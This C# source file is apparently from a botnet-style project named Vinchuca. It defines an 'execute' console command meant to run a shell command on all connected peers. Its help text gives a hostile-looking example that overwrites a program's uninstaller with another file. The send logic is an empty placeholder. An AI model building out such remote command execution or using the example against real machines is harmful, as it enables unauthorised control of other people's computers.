using System;
using System.Collections.Generic;
using Mono.Options;

namespace Vinchuca.REPL
{
    class ExecuteCommand : Command
    {
        private readonly CommandLineReader _repl;
        public bool ShowHelp { get; set; }

        public ExecuteCommand(Agent agent, CommandLineReader repl)
            : base("execute", "Execute a shell command in all the peers")
        {
            _repl = repl;
            Options = new OptionSet() {
                "usage: execute command",
                "",
                "Execute a shell command in all the peers. It doesn't return the output.",
                "eg: execute copy ~my.tmp c:\\Program Files (x86)\\Notepad++\\unistall.exe",
                { "help|h|?","Show this message and exit.", v => ShowHelp = v != null },
            };
            _repl.AddAutocompletionWords("execute");
        }

        public override int Invoke(IEnumerable<string> args)
        {
            try
            {
                var extra = Options.Parse(args);
                if (ShowHelp)
                {
                    Options.WriteOptionDescriptions(CommandSet.Out);
                    return 0;
                }
                if (extra.Count == 0)
                {
                    _repl.Console.WriteLine("commands: Missing required argument `command`.");
                    _repl.Console.WriteLine("commands: Use `help execute` for details.");
                    return 1;
                }
                ///
                return 0;
            }
            catch (Exception e)
            {
                //_repl.Console.WriteLine("commands: {0}", CommandDemo.Verbosity >= 1 ? e.ToString() : e.Message);
                return 1;
            }
        }
    }
}
